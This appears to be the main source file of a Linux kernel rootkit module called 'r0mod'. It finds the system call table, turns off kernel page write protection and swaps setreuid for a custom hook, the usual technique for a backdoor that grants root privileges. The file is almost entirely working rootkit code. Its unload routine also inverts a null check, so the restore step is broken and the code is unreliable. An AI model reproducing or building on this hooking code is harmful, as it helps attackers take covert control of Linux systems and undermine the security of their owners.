#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/unistd.h>
#include <linux/syscalls.h>

#include <r0mod/global.h>
#include <r0mod/hooks.h>
#include <r0mod/utils.h>

static int __init r0mod_init(void)
{
    fm_alert("Module starting...\n");

    if(!(sct = locate_sct()))
        return -1;

    fm_alert("sys_call_table: %lx\n", (unsigned long)sct);

    disable_page_protection();
    {
        fm_alert("sys_call_table: Hooking setreuid!\n");
        orig_setreuid = (void *)sct[__NR_setreuid];
        sct[__NR_setreuid] = (unsigned long*)new_setreuid;
    }
    enable_page_protection();

    return 0;
}

static void __exit r0mod_exit(void)
{
    fm_alert("Module ending...\n");

    if(!sct)
    {
        disable_page_protection();
        {
            fm_alert("sys_call_table: Restoring setreuid!\n");
            sct[__NR_setreuid] = (unsigned long*)orig_setreuid;
        }
        enable_page_protection();
    }
}

module_init(r0mod_init);
module_exit(r0mod_exit);
MODULE_LICENSE("GPL");
